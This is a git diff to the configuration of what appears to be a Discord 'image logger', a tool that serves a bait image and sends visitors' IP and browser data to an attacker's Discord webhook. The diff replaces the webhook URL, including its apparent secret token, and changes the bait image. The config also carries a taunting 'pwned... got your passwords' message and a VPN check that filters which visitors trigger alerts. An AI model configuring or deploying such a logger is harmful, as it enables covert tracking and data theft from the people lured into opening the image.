@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1340466390146224148/vmB16pjWQEBuUVECtWPsGILZChqMVJt6QKk-74YirxZaE33lBewDWT2dbVCeHnSM2LMJ",
-    "image": "https://i1.sndcdn.com/artworks-sr1dnWi9wSuG9znY-cyVyyg-t1080x1080.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1341350891525111818/DQr2sUsr7BH8QY5JEiL3jxMTsoVOx4RhPwr7Ffm8jutIQDoRFc-LGsZc56OTWuPscFf3",
+    "image": "https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcTemqLEeFWMRj0xWvm5U0Rds0S8IKyCTcjZ-lZRrXbb6ikx6aKw-M4PXJSSgew9h5mW5Ff-nQBl0aomikdbo3EbkyfKXI-pJhD2hVDQeXY", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -29,7 +29,7 @@ config = {
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
         "message": "This browser has been pwned by DC4 i now got your information and passwords...", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
+        "richMessage": False, # Enable rich text? (See README for more info)
     },
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
